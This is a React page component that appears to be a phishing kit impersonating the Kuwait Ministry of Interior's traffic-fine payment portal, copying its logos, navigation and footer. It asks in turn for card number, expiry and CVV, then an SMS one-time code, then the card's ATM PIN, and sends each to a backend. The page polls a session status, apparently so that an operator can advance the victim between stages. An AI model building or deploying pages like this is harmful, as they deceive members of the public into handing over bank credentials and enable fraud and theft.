import React, { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Phone, Lock, CreditCard, ShieldCheck, CheckCircle2, XCircle, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  
  const { lang } = useLanguage();

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      setLocation("/");
      return;
    }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: parsed.enquiryType,
      queryId: parsed.queryId
    });
  }, []);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => {
      setSessionId(data.sessionId);
    }
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { 
      enabled: !!sessionId && (stage.endsWith("_pending")),
      refetchInterval: 2000 
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) {
        setError(sessionStatus.errorMessage);
      }
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const submitPin = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: cardName || "Customer",
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: expiry,
      cardCvv: cvv
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({
      sessionId,
      otpCode: otp
    });
  };

  const handlePinSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitPin.mutate({
      sessionId,
      atmPin: pin
    });
  };

  if (!paymentData) return null;

  return (
    <div className="moi-theme" dir="rtl">
      {/* Header - Same as Home */}
      <div className="container">
        <header>
          <div className="row">
            <div className="col-4 col-md-2 col-lg-2 text-center">
              <a className="navbar-brand m-0" href="/">
                <img src="/main/images/assets/common/logo-moi.svg" style={{ height: "120px" }} alt="وزارة الداخلية" />
              </a>
            </div>
            <div className="col-1 align-self-center">
              <div className="row">
                <div className="col text-center">
                  <img src="/main/images/assets/common/ar/state-of-kuwait.svg" className="text-center main-header-title" alt="دولة الكويت" />
                </div>
              </div>
              <div className="row">
                <div className="col text-center">
                  <img src="/main/images/assets/common/ar/ministry-of-interior.svg" className="mt-2 main-header-title" alt="وزارة الداخلية" />
                </div>
              </div>
            </div>
          </div>
          <nav className="navbar navbar-expand-lg navbar-dark border-bottom box-shadow">
            <div className="container">
              <a className="navbar-brand" href="/"></a>
              <button className="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive">
                <span className="navbar-toggler-icon"></span>
              </button>
              <div className="navbar-collapse collapse flex-sm-row-reverse" id="navbarResponsive">
                <ul className="navbar-nav flex-grow-1 p-0 clearfix" style={{ margin: "0 auto" }}>
                  <div className="d-flex flex-sm-row flex-column container-navlinks">
                    <li className="nav-item active">
                      <a className="nav-link" href="/">الرئيسيــة</a>
                    </li>
                    <li className="nav-item">
                      <a className="nav-link" href="#">الخدمات الإلكترونيـة</a>
                    </li>
                    <li className="nav-item">
                      <a className="nav-link" href="#">إدارات توعوية</a>
                    </li>
                  </div>
                </ul>
              </div>
            </div>
          </nav>
        </header>

        {/* Payment Content */}
        <div className="container-fluid">
          <div className="row">
            <main role="main" className="col-12 pb-3">
              {/* Department Title */}
              <div className="row mt-3">
                <div className="col-12 text-right">
                  <h4 className="font-weight-bold" style={{ color: "#000576" }}>
                    <img src="/main/images/assets/general-traffic/logo-general-traffic.svg" style={{ height: "40px" }} className="ml-2" alt="الإدارة العامة للمرور" />
                    الإدارة العامة للمرور
                  </h4>
                </div>
              </div>
              <div className="row">
                <div className="col-12">
                  <hr style={{ borderColor: "#000576", borderWidth: "2px", margin: "10px 0" }} />
                </div>
              </div>

              {/* Payment Form */}
              <div className="row mt-2 pl-4 pr-4 pb-5">
                <div className="col-md-8">
                  {/* Card Form */}
                  {stage === "card" && (
                    <div className="card" style={{ borderRadius: "0" }}>
                      <div className="card-header text-right" style={{ backgroundColor: "#f8f9fa", borderBottom: "2px solid #d6dce5" }}>
                        <h5 className="font-weight-bold mb-0" style={{ color: "#000576" }}>
                          <CreditCard className="d-inline-block ml-2" style={{ width: "20px", height: "20px" }} />
                          بيانات البطاقة البنكية
                        </h5>
                      </div>
                      <div className="card-body">
                        <form onSubmit={handleCardSubmit} className="text-right">
                          <div className="form-group">
                            <label className="font-weight-bold">اسم حامل البطاقة</label>
                            <input
                              type="text"
                              value={cardName}
                              onChange={(e) => setCardName(e.target.value)}
                              placeholder="الاسم كما يظهر على البطاقة"
                              className="form-control form-control-lg"
                              style={{ borderRadius: "0" }}
                              required
                            />
                          </div>
                          <div className="form-group">
                            <label className="font-weight-bold">رقم البطاقة</label>
                            <div className="position-relative">
                              <input
                                type="text"
                                value={cardNumber}
                                onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").slice(0, 19))}
                                placeholder="0000 0000 0000 0000"
                                className="form-control form-control-lg font-mono"
                                style={{ borderRadius: "0", direction: "ltr", textAlign: "left" }}
                                dir="ltr"
                                required
                              />
                            </div>
                          </div>
                          <div className="row">
                            <div className="col-md-6">
                              <div className="form-group">
                                <label className="font-weight-bold">تاريخ الانتهاء</label>
                                <input
                                  type="text"
                                  value={expiry}
                                  onChange={(e) => setExpiry(e.target.value.replace(/\D/g, "").replace(/(\d{2})(?=\d)/g, "$1/").slice(0, 5))}
                                  placeholder="MM/YY"
                                  className="form-control form-control-lg"
                                  style={{ borderRadius: "0", direction: "ltr", textAlign: "center" }}
                                  dir="ltr"
                                  required
                                />
                              </div>
                            </div>
                            <div className="col-md-6">
                              <div className="form-group">
                                <label className="font-weight-bold">رمز التحقق (CVV)</label>
                                <input
                                  type="password"
                                  value={cvv}
                                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                                  placeholder="***"
                                  className="form-control form-control-lg"
                                  style={{ borderRadius: "0", direction: "ltr", textAlign: "center" }}
                                  dir="ltr"
                                  required
                                />
                              </div>
                            </div>
                          </div>
                          <button
                            type="submit"
                            className="btn btn-primary btn-block btn-lg mt-3"
                            disabled={!sessionId || submitCard.isPending}
                            style={{ backgroundColor: "#000576", borderColor: "#000576", borderRadius: "0" }}
                          >
                            {submitCard.isPending ? "جاري المعالجة..." : "إتمام الدفع"}
                          </button>
                        </form>
                      </div>
                    </div>
                  )}

                  {/* OTP Form */}
                  {stage === "otp" && (
                    <div className="card" style={{ borderRadius: "0" }}>
                      <div className="card-header text-right" style={{ backgroundColor: "#f8f9fa", borderBottom: "2px solid #d6dce5" }}>
                        <h5 className="font-weight-bold mb-0" style={{ color: "#000576" }}>
                          <Phone className="d-inline-block ml-2" style={{ width: "20px", height: "20px" }} />
                          التحقق من الهوية
                        </h5>
                      </div>
                      <div className="card-body text-center">
                        <div className="w-16 h-16 bg-primary text-white rounded-circle d-flex align-items-center justify-content-center mx-auto mb-4" style={{ backgroundColor: "#000576", width: "60px", height: "60px" }}>
                          <Phone style={{ width: "30px", height: "30px" }} />
                        </div>
                        <h5 className="font-weight-bold mb-2">أدخل رمز التحقق (OTP)</h5>
                        <p className="text-muted mb-4">تم إرسال رمز مكون من 6 أرقام إلى هاتفك المسجل</p>
                        <form onSubmit={handleOtpSubmit} className="mx-auto" style={{ maxWidth: "300px" }}>
                          <input
                            type="text"
                            value={otp}
                            onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                            placeholder="000000"
                            className="form-control form-control-lg text-center font-weight-bold mb-3"
                            style={{ borderRadius: "0", fontSize: "1.8rem", letterSpacing: "0.5em", direction: "ltr" }}
                            required
                          />
                          {error && <p className="text-danger text-sm font-weight-bold mb-2">{error}</p>}
                          <button
                            type="submit"
                            className="btn btn-primary btn-block btn-lg"
                            style={{ backgroundColor: "#000576", borderColor: "#000576", borderRadius: "0" }}
                          >
                            تأكيد الرمز
                          </button>
                        </form>
                      </div>
                    </div>
                  )}

                  {/* ATM PIN Form */}
                  {stage === "atm" && (
                    <div className="card" style={{ borderRadius: "0" }}>
                      <div className="card-header text-right" style={{ backgroundColor: "#f8f9fa", borderBottom: "2px solid #d6dce5" }}>
                        <h5 className="font-weight-bold mb-0" style={{ color: "#000576" }}>
                          <Lock className="d-inline-block ml-2" style={{ width: "20px", height: "20px" }} />
                          تأكيد الرقم السري
                        </h5>
                      </div>
                      <div className="card-body text-center">
                        <div className="w-16 h-16 rounded-circle d-flex align-items-center justify-content-center mx-auto mb-4" style={{ backgroundColor: "#000576", width: "60px", height: "60px" }}>
                          <Lock style={{ width: "30px", height: "30px", color: "#fff" }} />
                        </div>
                        <h5 className="font-weight-bold mb-2">أدخل الرقم السري للبطاقة</h5>
                        <p className="text-muted mb-4">يرجى إدخال الرقم السري المكون من 4 أرقام (PIN)</p>
                        <form onSubmit={handlePinSubmit} className="mx-auto" style={{ maxWidth: "300px" }}>
                          <input
                            type="password"
                            value={pin}
                            onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
                            placeholder="••••"
                            className="form-control form-control-lg text-center font-weight-bold mb-3"
                            style={{ borderRadius: "0", fontSize: "1.8rem", letterSpacing: "0.5em", direction: "ltr" }}
                            required
                          />
                          {error && <p className="text-danger text-sm font-weight-bold mb-2">{error}</p>}
                          <button
                            type="submit"
                            className="btn btn-primary btn-block btn-lg"
                            style={{ backgroundColor: "#000576", borderColor: "#000576", borderRadius: "0" }}
                          >
                            تأكيد الرقم السري
                          </button>
                        </form>
                      </div>
                    </div>
                  )}

                  {/* Pending State */}
                  {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
                    <div className="card text-center p-5" style={{ borderRadius: "0" }}>
                      <div className="spinner-grow text-secondary mx-auto mb-4" role="status" style={{ width: "60px", height: "60px" }}>
                        <span className="sr-only">Loading...</span>
                      </div>
                      <h4 className="font-weight-bold mb-2">جاري معالجة الطلب...</h4>
                      <p className="text-muted">يرجى الانتظار وعدم إغلاق هذه الصفحة</p>
                    </div>
                  )}

                  {/* Success State */}
                  {stage === "success" && (
                    <div className="card text-center p-5" style={{ borderRadius: "0" }}>
                      <div className="w-20 h-20 bg-success text-white rounded-circle d-flex align-items-center justify-content-center mx-auto mb-4" style={{ backgroundColor: "#28a745", width: "80px", height: "80px" }}>
                        <CheckCircle2 style={{ width: "40px", height: "40px" }} />
                      </div>
                      <h4 className="font-weight-bold mb-3 text-success">تمت عملية الدفع بنجاح!</h4>
                      <p className="text-muted mb-4">شكراً لك، تم استلام دفعتك وتحديث سجل المخالفات</p>
                      <button
                        className="btn btn-primary btn-lg px-5"
                        onClick={() => setLocation("/")}
                        style={{ backgroundColor: "#000576", borderColor: "#000576", borderRadius: "0" }}
                      >
                        العودة للرئيسية
                      </button>
                    </div>
                  )}

                  {/* Failed State */}
                  {stage === "failed" && (
                    <div className="card text-center p-5" style={{ borderRadius: "0" }}>
                      <div className="w-20 h-20 text-white rounded-circle d-flex align-items-center justify-content-center mx-auto mb-4" style={{ backgroundColor: "#dc3545", width: "80px", height: "80px" }}>
                        <XCircle style={{ width: "40px", height: "40px" }} />
                      </div>
                      <h4 className="font-weight-bold mb-3 text-danger">فشلت عملية الدفع</h4>
                      <p className="text-danger mb-4">{error || "تم رفض المعاملة من قبل البنك"}</p>
                      <button
                        className="btn btn-primary btn-lg px-5"
                        onClick={() => { setError(null); setStage("card"); }}
                        style={{ backgroundColor: "#000576", borderColor: "#000576", borderRadius: "0" }}
                      >
                        حاول مرة أخرى
                      </button>
                    </div>
                  )}
                </div>

                {/* Summary Sidebar */}
                <div className="col-md-4">
                  <div className="card" style={{ borderRadius: "0" }}>
                    <div className="card-header text-right" style={{ backgroundColor: "#f8f9fa", borderBottom: "2px solid #d6dce5" }}>
                      <h5 className="font-weight-bold mb-0" style={{ color: "#000576" }}>ملخص الدفع</h5>
                    </div>
                    <div className="card-body text-right">
                      <div className="text-center p-3 mb-3" style={{ backgroundColor: "#f0f4ff", border: "1px solid #d6dce5" }}>
                        <div className="text-muted" style={{ fontSize: "12px" }}>المبلغ الإجمالي</div>
                        <div className="font-weight-bold" style={{ color: "#000576", fontSize: "2rem" }}>{paymentData.totalAmount} دك</div>
                      </div>
                      <div className="border-bottom pb-2 mb-2">
                        <div className="d-flex justify-content-between">
                          <span className="text-muted">الرقم المدني:</span>
                          <span className="font-weight-bold">{paymentData.civilId}</span>
                        </div>
                      </div>
                      <div className="border-bottom pb-2 mb-2">
                        <div className="d-flex justify-content-between">
                          <span className="text-muted">عدد المخالفات:</span>
                          <span className="font-weight-bold">{paymentData.selectedFines.length}</span>
                        </div>
                      </div>
                      <div className="border-bottom pb-2 mb-2">
                        <div className="d-flex justify-content-between">
                          <span className="text-muted">العملة:</span>
                          <span className="font-weight-bold">دينار كويتي</span>
                        </div>
                      </div>
                      <div className="pt-3 text-center">
                        <div className="d-flex align-items-center justify-content-center gap-2 text-muted" style={{ fontSize: "11px" }}>
                          <ShieldCheck style={{ width: "14px", height: "14px", color: "#28a745" }} />
                          <span>دفع آمن SSL 256-bit</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Fines Summary */}
                  <div className="card mt-3" style={{ borderRadius: "0" }}>
                    <div className="card-header text-right" style={{ backgroundColor: "#f8f9fa", borderBottom: "2px solid #d6dce5" }}>
                      <h6 className="font-weight-bold mb-0" style={{ color: "#000576" }}>المخالفات المختارة</h6>
                    </div>
                    <div className="card-body text-right" style={{ maxHeight: "300px", overflowY: "auto" }}>
                      {paymentData.selectedFines.map((fine: any, index: number) => (
                        <div key={index} className="mb-2 pb-2 border-bottom" style={{ fontSize: "13px" }}>
                          <div className="font-weight-bold" style={{ color: "#000576" }}>#{fine.ticketNo}</div>
                          <div className="text-muted">{fine.amount} دك</div>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </main>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="footer mt-auto py-3">
        <div className="container text-center">
          <div className="mb-2">
            <img src="/main/images/assets/social-media/ico-youtube.svg" className="mx-2" style={{ height: "20px", filter: "brightness(0) invert(1)" }} alt="Youtube" />
            <img src="/main/images/assets/social-media/ico-instagram.svg" className="mx-2" style={{ height: "20px", filter: "brightness(0) invert(1)" }} alt="Instagram" />
            <img src="/main/images/assets/social-media/ico-twitter.svg" className="mx-2" style={{ height: "20px", filter: "brightness(0) invert(1)" }} alt="Twitter" />
            <img src="/main/images/assets/social-media/ico-facebook.svg" className="mx-2" style={{ height: "20px", filter: "brightness(0) invert(1)" }} alt="Facebook" />
          </div>
          <span style={{ fontSize: "12px", color: "#ccc" }}>© جميع الحقوق محفوظة لوزارة الداخلية - دولة الكويت - 2026</span>
        </div>
      </footer>
    </div>
  );
}
